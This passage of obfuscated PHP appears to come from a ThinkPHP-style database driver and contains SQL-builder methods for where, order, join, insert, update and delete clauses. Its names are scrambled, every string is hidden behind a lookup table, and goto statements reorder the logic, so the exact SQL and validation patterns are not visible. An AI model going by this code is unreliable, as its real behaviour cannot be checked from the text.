$AĞøøŸÈ™ˆ[$E±Å†İˆØ[174]] : $E±Å†İˆØ[33], $E±Å†İˆØ[823] => isset($AĞøøŸÈ™ˆ[$E±Å†İˆØ[175]]) ? $AĞøøŸÈ™ˆ[$E±Å†İˆØ[175]] : $E±Å†İˆØ[33], $E±Å†İˆØ[17] => isset($AĞøøŸÈ™ˆ[$E±Å†İˆØ[75]]) ? substr($AĞøøŸÈ™ˆ[$E±Å†İˆØ[75]], 1) : $E±Å†İˆØ[33]); } else { preg_match($E±Å†İˆØ[918], trim($CùŠ¹óâÄ), $EÔß¥Û¼­¸); $aÛÀ‹ÅäÛ = array($E±Å†İˆØ[896] => $EÔß¥Û¼­¸[1], $E±Å†İˆØ[824] => $EÔß¥Û¼­¸[2], $E±Å†İˆØ[825] => $EÔß¥Û¼­¸[3], $E±Å†İˆØ[822] => $EÔß¥Û¼­¸[4], $E±Å†İˆØ[823] => $EÔß¥Û¼­¸[5], $E±Å†İˆØ[17] => $EÔß¥Û¼­¸[6]); } $aÛÀ‹ÅäÛ[$E±Å†İˆØ[851]] = $E±Å†İˆØ[33]; return $aÛÀ‹ÅäÛ; } protected function debug() { $d†«ÈÛŸ‡Ñ =& $_SERVER[¹Ò‹Ò¹]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $d†«ÈÛŸ‡Ñ[919]; if (think_config($d†«ÈÛŸ‡Ñ[920])) { think_status($d†«ÈÛŸ‡Ñ[921]); think_trace($this->queryStr . $d†«ÈÛŸ‡Ñ[922] . think_status($d†«ÈÛŸ‡Ñ[20], $d†«ÈÛŸ‡Ñ[921], 6) . $d†«ÈÛŸ‡Ñ[923], $d†«ÈÛŸ‡Ñ[33], $d†«ÈÛŸ‡Ñ[924]); } } protected function parseLock($F‹á“½µ¨ = false) { $cæÈÉŠò =& $_SERVER[¹Ò‹Ò¹]; if (!$F‹á“½µ¨) { return $cæÈÉŠò[33]; } if ($cæÈÉŠò[853] == $this->dbType) { return $cæÈÉŠò[925]; } return $cæÈÉŠò[926]; } protected function parseSet($Bã°Ê¦˜¿×) { $BÜ×É³ƒ¨¹ =& $_SERVER[¹Ò‹Ò¹]; foreach ($Bã°Ê¦˜¿× as $E®‰‘ß‚‰ => $c‘ãÌìÄµ) { if (is_array($c‘ãÌìÄµ) && $BÜ×É³ƒ¨¹[293] == $c‘ãÌìÄµ[0]) { $D–¼ëÕ‚É‹[] = $this->parseKey($E®‰‘ß‚‰) . $BÜ×É³ƒ¨¹[927] . $c‘ãÌìÄµ[1]; } elseif (is_scalar($c‘ãÌìÄµ) || is_null($c‘ãÌìÄµ)) { $D–¼ëÕ‚É‹[] = $this->parseKey($E®‰‘ß‚‰) . $BÜ×É³ƒ¨¹[927] . $this->parseValue($c‘ãÌìÄµ); } } return $BÜ×É³ƒ¨¹[928] . implode($BÜ×É³ƒ¨¹[47], $D–¼ëÕ‚É‹); } protected function bindParam($CùôÛ«Í¬Í, $eòœßù™…) { $this->bind[$_SERVER[¹Ò‹Ò¹][4] . $CùôÛ«Í¬Í] = $eòœßù™…; } protected function parseBind($D›Ã¸Ñµ×Ê) { $D›Ã¸Ñµ×Ê = array_merge($this->bind, $D›Ã¸Ñµ×Ê); $this->bind = array(); return $D›Ã¸Ñµ×Ê; } function parseKey(&$Dâ£×ºŠù, $cÕàßÃ›ÙÌ = true) { if ($cÕàßÃ›ÙÌ) { $Dâ£×ºŠù = $this->parseKeyCheck($Dâ£×ºŠù); } return $Dâ£×ºŠù; } function parseKeyCheck($aÇóÄŠÏ°) { $E§Õ÷Š‹à =& $_SERVER[¹Ò‹Ò¹]; $aÇóÄŠÏ° = trim($aÇóÄŠÏ°); if (!preg_match($E§Õ÷Š‹à[929], $aÇóÄŠÏ°)) { think_exception($E§Õ÷Š‹à[930] . $aÇóÄŠÏ°); } return $aÇóÄŠÏ°; } protected function parseValue($DÉâœíëêî) { $BïùŒöŞ¿É =& $_SERVER[¹Ò‹Ò¹]; if (is_string($DÉâœíëêî)) { $DÉâœíëêî = $BïùŒöŞ¿É[892] . $this->escapeString($DÉâœíëêî) . $BïùŒöŞ¿É[892]; } elseif (isset($DÉâœíëêî[0]) && is_string($DÉâœíëêî[0]) && strtolower($DÉâœíëêî[0]) == $BïùŒöŞ¿É[293]) { $DÉâœíëêî = $this->escapeString($DÉâœíëêî[1]); } elseif (is_array($DÉâœíëêî)) { $DÉâœíëêî = array_map(array($this, $BïùŒöŞ¿É[893]), $DÉâœíëêî); } elseif (is_bool($DÉâœíëêî)) { $DÉâœíëêî = $DÉâœíëêî ? $BïùŒöŞ¿É[86] : $BïùŒöŞ¿É[491]; } elseif (is_null($DÉâœíëêî)) { $DÉâœíëêî = $BïùŒöŞ¿É[102]; } return $DÉâœíëêî; } protected function parseField($aÁòçöÛÇ…) { $eŠÚ¦ğÁò =& $_SERVER[¹Ò‹Ò¹]; if (is_string($aÁòçöÛÇ…) && strpos($aÁòçöÛÇ…, $eŠÚ¦ğÁò[47])) { $aÁòçöÛÇ… = explode($eŠÚ¦ğÁò[47], $aÁòçöÛÇ…); } if (is_array($aÁòçöÛÇ…)) { $EŠ´ª®Ğ°õ = array(); foreach ($aÁòçöÛÇ… as $d…¨ƒ¯Œëò => $DåÀ¼·Èï) { if (!is_numeric($d…¨ƒ¯Œëò)) { $EŠ´ª®Ğ°õ[] = $this->parseKey($d…¨ƒ¯Œëò, !1) . $eŠÚ¦ğÁò[931] . $this->parseKey($DåÀ¼·Èï); } else { $EŠ´ª®Ğ°õ[] = $this->parseKey($DåÀ¼·Èï); } } $EÀ¸íï†‹¥ = implode($eŠÚ¦ğÁò[47], $EŠ´ª®Ğ°õ); } elseif (is_string($aÁòçöÛÇ…) && !empty($aÁòçöÛÇ…)) { $EÀ¸íï†‹¥ = $aÁòçöÛÇ…; } else { $EÀ¸íï†‹¥ = $eŠÚ¦ğÁò[181]; } return $EÀ¸íï†‹¥; } protected function parseTable($FŠ£é¾´Ä) { $dÍç²ÁŠé =& $_SERVER[¹Ò‹Ò¹]; if (is_array($FŠ£é¾´Ä)) { $aİÏÃÔ÷† = array(); foreach ($FŠ£é¾´Ä as $FÑëŠÔÎ‹ => $EèˆÒ–†Â) { if (!is_numeric($FÑëŠÔÎ‹)) { $aİÏÃÔ÷†[] = $this->parseKey($FÑëŠÔÎ‹) . $dÍç²ÁŠé[50] . $this->parseKey($EèˆÒ–†Â); } else { $aİÏÃÔ÷†[] = $this->parseKey($FÑëŠÔÎ‹); } } $FŠ£é¾´Ä = $aİÏÃÔ÷†; } elseif (is_string($FŠ£é¾´Ä)) { if (strstr($FŠ£é¾´Ä, $dÍç²ÁŠé[50])) { return $FŠ£é¾´Ä; } $FŠ£é¾´Ä = explode($dÍç²ÁŠé[47], $FŠ£é¾´Ä); array_walk($FŠ£é¾´Ä, array($this, $dÍç²ÁŠé[842])); } return $dÍç²ÁŠé[836] . trim(implode($dÍç²ÁŠé[932], $FŠ£é¾´Ä), $dÍç²ÁŠé[380]) . $dÍç²ÁŠé[836]; } protected function parseWhere($Fàéñ©Ú®) { $A†¤¥— =& $_SERVER[¹Ò‹Ò¹]; $c½“»±æÖä = $A†¤¥—[33]; if (is_string($Fàéñ©Ú®)) { $c½“»±æÖä = $Fàéñ©Ú®; } else { $döİ‚ ¦†‹ = isset($Fàéñ©Ú®[$A†¤¥—[933]]) ? strtoupper($Fàéñ©Ú®[$A†¤¥—[933]]) : $A†¤¥—[33]; if (in_array($döİ‚ ¦†‹, array($A†¤¥—[934], $A†¤¥—[935], $A†¤¥—[936]))) { $döİ‚ ¦†‹ = $A†¤¥—[50] . $döİ‚ ¦†‹ . $A†¤¥—[50]; unset($Fàéñ©Ú®[$A†¤¥—[933]]); } else { $döİ‚ ¦†‹ = $A†¤¥—[937]; } foreach ($Fàéñ©Ú® as $E÷«™µÅ => $fï¹ ë„÷) { $c½“»±æÖä .= $A†¤¥—[273]; if (is_numeric($E÷«™µÅ)) { $E÷«™µÅ = $A†¤¥—[938]; } if (0 === strpos($E÷«™µÅ, $A†¤¥—[70])) { $c½“»±æÖä .= $this->parseThinkWhere($E÷«™µÅ, $fï¹ ë„÷); } else { if (!preg_match($A†¤¥—[939], trim($E÷«™µÅ))) { think_exception(think_lang($A†¤¥—[940]) . $A†¤¥—[4] . $E÷«™µÅ); } $Bî½°¾ÜÎ = is_array($fï¹ ë„÷) && isset($fï¹ ë„÷[$A†¤¥—[941]]); $E÷«™µÅ = trim($E÷«™µÅ); if (strpos($E÷«™µÅ, $A†¤¥—[279])) { $eØ…¦âá²š = explode($A†¤¥—[279], $E÷«™µÅ); $CñĞ„ãÉ³í = array(); foreach ($eØ…¦âá²š as $F»ïï”À‰ => $F²µª©ÂÜ¬) { $Eğõƒ¢ÏË­ = $Bî½°¾ÜÎ ? $fï¹ ë„÷[$F»ïï”À‰] : $fï¹ ë„÷; $CñĞ„ãÉ³í[] = $A†¤¥—[256] . $this->parseWhereItem($this->parseKey($F²µª©ÂÜ¬), $Eğõƒ¢ÏË­) . $A†¤¥—[841]; } $c½“»±æÖä .= implode($A†¤¥—[942], $CñĞ„ãÉ³í); } elseif (strpos($E÷«™µÅ, $A†¤¥—[280])) { $eØ…¦âá²š = explode($A†¤¥—[280], $E÷«™µÅ); $CñĞ„ãÉ³í = array(); foreach ($eØ…¦âá²š as $F»ïï”À‰ => $F²µª©ÂÜ¬) { $Eğõƒ¢ÏË­ = $Bî½°¾ÜÎ ? $fï¹ ë„÷[$F»ïï”À‰] : $fï¹ ë„÷; $CñĞ„ãÉ³í[] = $A†¤¥—[256] . $this->parseWhereItem($this->parseKey($F²µª©ÂÜ¬), $Eğõƒ¢ÏË­) . $A†¤¥—[841]; } $c½“»±æÖä .= implode($A†¤¥—[937], $CñĞ„ãÉ³í); } else { $c½“»±æÖä .= $this->parseWhereItem($this->parseKey($E÷«™µÅ), $fï¹ ë„÷); } } $c½“»±æÖä .= $A†¤¥—[274] . $döİ‚ ¦†‹; } $c½“»±æÖä = substr($c½“»±æÖä, 0, -strlen($döİ‚ ¦†‹)); } return empty($c½“»±æÖä) ? $A†¤¥—[33] : $A†¤¥—[943] . $c½“»±æÖä; } protected function parseWhereItem($a‘ÌÄ‰Àò¦, $BÒøØØ˜È) { $Aµ‘Œ›ğŒ¤ =& $_SERVER[¹Ò‹Ò¹]; $b¦®ÂÄÊŞ = $Aµ‘Œ›ğŒ¤[33]; if (is_array($BÒøØØ˜È)) { if (is_string($BÒøØØ˜È[0])) { $cÅ®‚ŒùÖ = strtolower($BÒøØØ˜È[0]); if (in_array($BÒøØØ˜È[0], array($Aµ‘Œ›ğŒ¤[927], $Aµ‘Œ›ğŒ¤[944], $Aµ‘Œ›ğŒ¤[945], $Aµ‘Œ›ğŒ¤[946], $Aµ‘Œ›ğŒ¤[947], $Aµ‘Œ›ğŒ¤[948]))) { $b¦®ÂÄÊŞ .= $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $BÒøØØ˜È[0] . $Aµ‘Œ›ğŒ¤[50] . $this->parseValue($BÒøØØ˜È[1]); } elseif (preg_match($Aµ‘Œ›ğŒ¤[949], $BÒøØØ˜È[0])) { $b¦®ÂÄÊŞ .= $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $this->exp[$cÅ®‚ŒùÖ] . $Aµ‘Œ›ğŒ¤[50] . $this->parseValue($BÒøØØ˜È[1]); } elseif (preg_match($Aµ‘Œ›ğŒ¤[950], $BÒøØØ˜È[0])) { if (is_array($BÒøØØ˜È[1])) { $bŞãĞğ„…Î = isset($BÒøØØ˜È[2]) ? strtoupper($BÒøØØ˜È[2]) : $Aµ‘Œ›ğŒ¤[935]; if (in_array($bŞãĞğ„…Î, array($Aµ‘Œ›ğŒ¤[934], $Aµ‘Œ›ğŒ¤[935], $Aµ‘Œ›ğŒ¤[936]))) { $f¸ÒÀî‡ôÊ = array(); foreach ($BÒøØØ˜È[1] as $cŒ•ÅŒƒ°Š) { $f¸ÒÀî‡ôÊ[] = $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $this->exp[$cÅ®‚ŒùÖ] . $Aµ‘Œ›ğŒ¤[50] . $this->parseValue($cŒ•ÅŒƒ°Š); } $b¦®ÂÄÊŞ .= $Aµ‘Œ›ğŒ¤[256] . implode($Aµ‘Œ›ğŒ¤[50] . $bŞãĞğ„…Î . $Aµ‘Œ›ğŒ¤[50], $f¸ÒÀî‡ôÊ) . $Aµ‘Œ›ğŒ¤[841]; } } else { $b¦®ÂÄÊŞ .= $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $this->exp[$cÅ®‚ŒùÖ] . $Aµ‘Œ›ğŒ¤[50] . $this->parseValue($BÒøØØ˜È[1]); } } elseif ($Aµ‘Œ›ğŒ¤[293] == $cÅ®‚ŒùÖ) { $b¦®ÂÄÊŞ .= $Aµ‘Œ›ğŒ¤[839] . $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $BÒøØØ˜È[1] . $Aµ‘Œ›ğŒ¤[951]; } elseif (preg_match($Aµ‘Œ›ğŒ¤[952], $BÒøØØ˜È[0])) { $b¦®ÂÄÊŞ .= $BÒøØØ˜È[0]; } elseif (preg_match($Aµ‘Œ›ğŒ¤[953], $BÒøØØ˜È[0])) { if (isset($BÒøØØ˜È[2]) && $Aµ‘Œ›ğŒ¤[293] == $BÒøØØ˜È[2]) { $b¦®ÂÄÊŞ .= $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $this->exp[$cÅ®‚ŒùÖ] . $Aµ‘Œ›ğŒ¤[50] . $BÒøØØ˜È[1]; } else { if (is_string($BÒøØØ˜È[1])) { $BÒøØØ˜È[1] = explode($Aµ‘Œ›ğŒ¤[47], $BÒøØØ˜È[1]); } $D˜Ä¾»â = implode($Aµ‘Œ›ğŒ¤[47], $this->parseValue($BÒøØØ˜È[1])); $b¦®ÂÄÊŞ .= $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $this->exp[$cÅ®‚ŒùÖ] . $Aµ‘Œ›ğŒ¤[839] . $D˜Ä¾»â . $Aµ‘Œ›ğŒ¤[841]; } } elseif (preg_match($Aµ‘Œ›ğŒ¤[954], $BÒøØØ˜È[0])) { $B±šª‡” § = is_string($BÒøØØ˜È[1]) ? explode($Aµ‘Œ›ğŒ¤[47], $BÒøØØ˜È[1]) : $BÒøØØ˜È[1]; $b¦®ÂÄÊŞ .= $Aµ‘Œ›ğŒ¤[839] . $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $this->exp[$cÅ®‚ŒùÖ] . $Aµ‘Œ›ğŒ¤[50] . $this->parseValue($B±šª‡” §[0]) . $Aµ‘Œ›ğŒ¤[937] . $this->parseValue($B±šª‡” §[1]) . $Aµ‘Œ›ğŒ¤[274]; } else { think_exception(think_lang($Aµ‘Œ›ğŒ¤[940]) . $Aµ‘Œ›ğŒ¤[4] . $BÒøØØ˜È[0]); } } else { $aá®Ë‡¥ï = count($BÒøØØ˜È); $C†¨ö–ù¤† = $Aµ‘Œ›ğŒ¤[33]; if (is_string($BÒøØØ˜È[$aá®Ë‡¥ï - 1])) { $C†¨ö–ù¤† = isset($BÒøØØ˜È[$aá®Ë‡¥ï - 1]) ? strtoupper($BÒøØØ˜È[$aá®Ë‡¥ï - 1]) : $Aµ‘Œ›ğŒ¤[33]; if (in_array($C†¨ö–ù¤†, array($Aµ‘Œ›ğŒ¤[934], $Aµ‘Œ›ğŒ¤[935], $Aµ‘Œ›ğŒ¤[936]))) { $aá®Ë‡¥ï = $aá®Ë‡¥ï - 1; } } else { $C†¨ö–ù¤† = $Aµ‘Œ›ğŒ¤[934]; } for ($dƒæŞÏ‡ã» = 0; $dƒæŞÏ‡ã» < $aá®Ë‡¥ï; $dƒæŞÏ‡ã»++) { $B±šª‡” § = is_array($BÒøØØ˜È[$dƒæŞÏ‡ã»]) ? $BÒøØØ˜È[$dƒæŞÏ‡ã»][1] : $BÒøØØ˜È[$dƒæŞÏ‡ã»]; if ($Aµ‘Œ›ğŒ¤[293] == strtolower($BÒøØØ˜È[$dƒæŞÏ‡ã»][0])) { $b¦®ÂÄÊŞ .= $Aµ‘Œ›ğŒ¤[256] . $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $B±šª‡” § . $Aµ‘Œ›ğŒ¤[951] . $C†¨ö–ù¤† . $Aµ‘Œ›ğŒ¤[50]; } else { $Aİ­´‘‹Ú› = is_array($BÒøØØ˜È[$dƒæŞÏ‡ã»]) ? $this->exp[strtolower($BÒøØØ˜È[$dƒæŞÏ‡ã»][0])] : $Aµ‘Œ›ğŒ¤[927]; if (!$Aİ­´‘‹Ú› && is_array($BÒøØØ˜È[$dƒæŞÏ‡ã»]) && in_array($BÒøØØ˜È[$dƒæŞÏ‡ã»][0], array($Aµ‘Œ›ğŒ¤[927], $Aµ‘Œ›ğŒ¤[944], $Aµ‘Œ›ğŒ¤[945], $Aµ‘Œ›ğŒ¤[946], $Aµ‘Œ›ğŒ¤[947], $Aµ‘Œ›ğŒ¤[948]))) { $Aİ­´‘‹Ú› = $BÒøØØ˜È[$dƒæŞÏ‡ã»][0]; } $b¦®ÂÄÊŞ .= $Aµ‘Œ›ğŒ¤[256] . $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[50] . $Aİ­´‘‹Ú› . $Aµ‘Œ›ğŒ¤[50] . $this->parseValue($B±šª‡” §) . $Aµ‘Œ›ğŒ¤[951] . $C†¨ö–ù¤† . $Aµ‘Œ›ğŒ¤[50]; } } $b¦®ÂÄÊŞ = substr($b¦®ÂÄÊŞ, 0, -4); } } else { $b¦®ÂÄÊŞ .= $a‘ÌÄ‰Àò¦ . $Aµ‘Œ›ğŒ¤[955] . $this->parseValue($BÒøØØ˜È); } return $b¦®ÂÄÊŞ; } protected function parseThinkWhere($F³Ú¡ãßá, $E¾İôè¨²) { $fÑàù³¿î =& $_SERVER[¹Ò‹Ò¹]; $eÆÉ¡® „ô = $fÑàù³¿î[33]; switch ($F³Ú¡ãßá) { case $fÑàù³¿î[348]: $eÆÉ¡® „ô = $E¾İôè¨²; break; case $fÑàù³¿î[938]: $eÆÉ¡® „ô = is_string($E¾İôè¨²) ? $E¾İôè¨² : substr($this->parseWhere($E¾İôè¨²), 6); break; case $fÑàù³¿î[956]: parse_str($E¾İôè¨², $CäŠ“‚ŞøÍ); if (isset($CäŠ“‚ŞøÍ[$fÑàù³¿î[933]])) { $bÉÏò’ßŠ¤ = $fÑàù³¿î[50] . strtoupper($CäŠ“‚ŞøÍ[$fÑàù³¿î[933]]) . $fÑàù³¿î[50]; unset($CäŠ“‚ŞøÍ[$fÑàù³¿î[933]]); } else { $bÉÏò’ßŠ¤ = $fÑàù³¿î[937]; } $Dµö‰“Ó“  = array(); foreach ($CäŠ“‚ŞøÍ as $EÇ‰‹ŒĞ’· => $d ÂÙ‰Ñ»Ó) { $Dµö‰“Ó“ [] = $this->parseKey($EÇ‰‹ŒĞ’·) . $fÑàù³¿î[955] . $this->parseValue($d ÂÙ‰Ñ»Ó); } $eÆÉ¡® „ô = implode($bÉÏò’ßŠ¤, $Dµö‰“Ó“ ); break; } return $eÆÉ¡® „ô; } protected function parseLimit($D”óŠÜ¦“£) { $dâƒªàë‘ =& $_SERVER[¹Ò‹Ò¹]; return !empty($D”óŠÜ¦“£) ? $dâƒªàë‘[48] . $D”óŠÜ¦“£ . $dâƒªàë‘[50] : $dâƒªàë‘[33]; } protected function parseJoin($eŸêÌ·½Ä”) { $aÆ”–ë­– =& $_SERVER[¹Ò‹Ò¹]; $aËÇ Â•ó = $aÆ”–ë­–[33]; if (!empty($eŸêÌ·½Ä”)) { if (is_array($eŸêÌ·½Ä”)) { foreach ($eŸêÌ·½Ä” as $f¬İÚ‡ª•Ò => $eÌŠÔÅÌÃ¾) { if (!1 !== stripos($eÌŠÔÅÌÃ¾, $aÆ”–ë­–[957])) { $aËÇ Â•ó .= $aÆ”–ë­–[50] . $eÌŠÔÅÌÃ¾; } else { $aËÇ Â•ó .= $aÆ”–ë­–[958] . $eÌŠÔÅÌÃ¾; } } } else { $aËÇ Â•ó .= $aÆ”–ë­–[958] . $eŸêÌ·½Ä”; } } $aËÇ Â•ó = preg_replace($aÆ”–ë­–[959], think_config($aÆ”–ë­–[865]) . $aÆ”–ë­–[960], $aËÇ Â•ó); return $aËÇ Â•ó; } protected function parseOrder($DÔ‰Êà„³È) { $FÇî—æ”ƒ± =& $_SERVER[¹Ò‹Ò¹]; if (is_array($DÔ‰Êà„³È)) { $F¤•¶•‹Ïº = array(); foreach ($DÔ‰Êà„³È as $Eîøáê¬É => $eïˆº•ëˆ‰) { if (is_numeric($Eîøáê¬É)) { $F¤•¶•‹Ïº[] = $this->parseKey($eïˆº•ëˆ‰); } else { $eïˆº•ëˆ‰ = in_array(strtoupper(trim($eïˆº•ëˆ‰)), array($FÇî—æ”ƒ±[961], $FÇî—æ”ƒ±[962])) ? $FÇî—æ”ƒ±[50] . $eïˆº•ëˆ‰ : $FÇî—æ”ƒ±[33]; if (preg_match($FÇî—æ”ƒ±[963], $Eîøáê¬É)) { $F¤•¶•‹Ïº[] = $this->parseKey($Eîøáê¬É) . $eïˆº•ëˆ‰; } else { think_exception($FÇî—æ”ƒ±[964] . $Eîøáê¬É); } } } $DÔ‰Êà„³È = implode($FÇî—æ”ƒ±[47], $F¤•¶•‹Ïº); } return !empty($DÔ‰Êà„³È) ? $FÇî—æ”ƒ±[965] . $DÔ‰Êà„³È : $FÇî—æ”ƒ±[33]; } protected function parseGroup($E…Ş˜¢Êá) { $dáÏĞ˜ÅøŸ =& $_SERVER[¹Ò‹Ò¹]; return !empty($E…Ş˜¢Êá) ? $dáÏĞ˜ÅøŸ[966] . $E…Ş˜¢Êá : $dáÏĞ˜ÅøŸ[33]; } protected function parseHaving($E¤•¿ò¶Ê) { $D«‡âî¿Ñ =& $_SERVER[¹Ò‹Ò¹]; return !empty($E¤•¿ò¶Ê) ? $D«‡âî¿Ñ[967] . $E¤•¿ò¶Ê : $D«‡âî¿Ñ[33]; } protected function parseComment($cã‰†Ü¾ø) { $CäĞÚ“é‰¦ =& $_SERVER[¹Ò‹Ò¹]; return !empty($cã‰†Ü¾ø) ? $CäĞÚ“é‰¦[968] . $cã‰†Ü¾ø . $CäĞÚ“é‰¦[969] : $CäĞÚ“é‰¦[33]; } protected function parseDistinct($a±Ç³°¯‘·) { $a¤…¤¬‘µ =& $_SERVER[¹Ò‹Ò¹]; return !empty($a±Ç³°¯‘·) ? $a¤…¤¬‘µ[970] : $a¤…¤¬‘µ[33]; } protected function parseUnion($e±ë½åµ®„) { $f¤ÄÙÖ® =& $_SERVER[¹Ò‹Ò¹]; if (empty($e±ë½åµ®„)) { return $f¤ÄÙÖ®[33]; } if (isset($e±ë½åµ®„[$f¤ÄÙÖ®[344]])) { $D»Š™³Â†Ì = $f¤ÄÙÖ®[971]; unset($e±ë½åµ®„[$f¤ÄÙÖ®[344]]); } else { $D»Š™³Â†Ì = $f¤ÄÙÖ®[972]; } foreach ($e±ë½åµ®„ as $bÊÑÒÔÑÍ) { $CˆÏÍ”¬˜Û[] = $D»Š™³Â†Ì . (is_array($bÊÑÒÔÑÍ) ? $this->buildSelectSql($bÊÑÒÔÑÍ) : $bÊÑÒÔÑÍ); } return implode($f¤ÄÙÖ®[50], $CˆÏÍ”¬˜Û); } public function insert($DŠæÕ¾Ç‚¦, $AÔ‰‚èê× = array(), $dù°›Ú•ØÆ = false) { goto d¸ëÊÏ«–‹; eÇƒÙîš‚: foreach ($DŠæÕ¾Ç‚¦ as $bğŸôÍŠ–ò => $D¸ğ’“„¯) { if (is_array($D¸ğ’“„¯) && $F‰Ñº½…ø[293] == $D¸ğ’“„¯[0]) { $BïÁªÍ±à«[] = $this->parseKey($bğŸôÍŠ–ò); $a¿ÈÕß‡öŒ[] = $D¸ğ’“„¯[1]; } elseif (is_scalar($D¸ğ’“„¯) || is_null($D¸ğ’“„¯)) { $BïÁªÍ±à«[] = $this->parseKey($bğŸôÍŠ–ò); $a¿ÈÕß‡öŒ[] = $this->parseValue($D¸ğ’“„¯); } } $a³Ÿ²Í£æ = ($dù°›Ú•ØÆ ? $F‰Ñº½…ø[843] : $F‰Ñº½…ø[844]) . $F‰Ñº½…ø[845] . $this->parseTable($AÔ‰‚èê×[$F‰Ñº½…ø[275]]) . $F‰Ñº½…ø[839] . implode($F‰Ñº½…ø[47], $BïÁªÍ±à«) . $F‰Ñº½…ø[840] . implode($F‰Ñº½…ø[47], $a¿ÈÕß‡öŒ) . $F‰Ñº½…ø[841]; $a³Ÿ²Í£æ .= $this->parseLock(isset($AÔ‰‚èê×[$F‰Ñº½…ø[791]]) ? $AÔ‰‚èê×[$F‰Ñº½…ø[791]] : !1); goto aÕäô®Û½“; d¸ëÊÏ«–‹: $F‰Ñº½…ø =& $_SERVER[¹Ò‹Ò¹]; $a¿ÈÕß‡öŒ = $BïÁªÍ±à« = array(); $this->model = $AÔ‰‚èê×[$F‰Ñº½…ø[277]]; goto eÇƒÙîš‚; aÕäô®Û½“: $a³Ÿ²Í£æ .= $this->parseComment(!empty($AÔ‰‚èê×[$F‰Ñº½…ø[350]]) ? $AÔ‰‚èê×[$F‰Ñº½…ø[350]] : $F‰Ñº½…ø[33]); return $this->execute($a³Ÿ²Í£æ, $this->parseBind(!empty($AÔ‰‚èê×[$F‰Ñº½…ø[281]]) ? $AÔ‰‚èê×[$F‰Ñº½…ø[281]] : array())); goto dæ»…×‚åŠ; dæ»…×‚åŠ: } public function selectInsert($DÎ…óÎ¾š½, $BŸƒàÁ¨´, $F£é™Ÿ…’Ú = array()) { goto dÉÈİíÖ•¯; dÉÈİíÖ•¯: $CáåŠÅ¨Îó =& $_SERVER[¹Ò‹Ò¹]; $this->model = $F£é™Ÿ…’Ú[$CáåŠÅ¨Îó[277]]; if (is_string($DÎ…óÎ¾š½)) { $DÎ…óÎ¾š½ = explode($CáåŠÅ¨Îó[47], $DÎ…óÎ¾š½); } goto A»†îˆÛĞ; B‡‹ ÕÕê: return $this->execute($d¶áÓİ¯¹è, $this->parseBind(!empty($F£é™Ÿ…’Ú[$CáåŠÅ¨Îó[281]]) ? $F£é™Ÿ…’Ú[$CáåŠÅ¨Îó[281]] : array())); goto AË•©ÜÕÏ™; A»†îˆÛĞ: array_walk($DÎ…óÎ¾š½, array($this, $CáåŠÅ¨Îó[842])); $d¶áÓİ¯¹è = $CáåŠÅ¨Îó[973] . $this->parseTable($BŸƒàÁ¨´) . $CáåŠÅ¨Îó[839] . implode($CáåŠÅ¨Îó[47], $DÎ…óÎ¾š½) . $CáåŠÅ¨Îó[951]; $d¶áÓİ¯¹è .= $this->buildSelectSql($F£é™Ÿ…’Ú); goto B‡‹ ÕÕê; AË•©ÜÕÏ™: } public function update($F›Ò™¥÷ôÅ, $a…Ìôä¥Œ) { $C††É—³ô¢ =& $_SERVER[¹Ò‹Ò¹]; $this->model = $a…Ìôä¥Œ[$C††É—³ô¢[277]]; $a„ÈÖå¶ë— = $C††É—³ô¢[974] . $this->parseTable($a…Ìôä¥Œ[$C††É—³ô¢[275]]) . $this->parseSet($F›Ò™¥÷ôÅ) . $this->parseWhere(!empty($a…Ìôä¥Œ[$C††É—³ô¢[271]]) ? $a…Ìôä¥Œ[$C††É—³ô¢[271]] : $C††É—³ô¢[33]) . $this->parseOrder(!empty($a…Ìôä¥Œ[$C††É—³ô¢[361]]) ? $a…Ìôä¥Œ[$C††É—³ô¢[361]] : $C††É—³ô¢[33]) . $this->parseLimit(!empty($a…Ìôä¥Œ[$C††É—³ô¢[288]]) ? $a…Ìôä¥Œ[$C††É—³ô¢[288]] : $C††É—³ô¢[33]) . $this->parseLock(isset($a…Ìôä¥Œ[$C††É—³ô¢[791]]) ? $a…Ìôä¥Œ[$C††É—³ô¢[791]] : !1) . $this->parseComment(!empty($a…Ìôä¥Œ[$C††É—³ô¢[350]]) ? $a…Ìôä¥Œ[$C††É—³ô¢[350]] : $C††É—³ô¢[33]); return $this->execute($a„ÈÖå¶ë—, $this->parseBind(!empty($a…Ìôä¥Œ[$C††É—³ô¢[281]]) ? $a…Ìôä¥Œ[$C††É—³ô¢[281]] : array())); } public function delete($D¡ƒÎù²ùÄ = array()) { $BáŸ„Î„¯É =& $_SERVER[¹Ò‹Ò¹]; $this->model = $D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[277]]; $bƒÉæ¶×÷ä = $BáŸ„Î„¯É[975] . $this->parseTable($D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[275]]) . $this->parseWhere(!empty($D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[271]]) ? $D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[271]] : $BáŸ„Î„¯É[33]) . $this->parseOrder(!empty($D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[361]]) ? $D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[361]] : $BáŸ„Î„¯É[33]) . $this->parseLimit(!empty($D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[288]]) ? $D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[288]] : $BáŸ„Î„¯É[33]) . $this->parseLock(isset($D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[791]]) ? $D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[791]] : !1) . $this->parseComment(!empty($D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[350]]) ? $D¡ƒÎù²ùÄ[$BáŸ„Î„¯É[350]] : $BáŸ„Î„¯É[33]); return 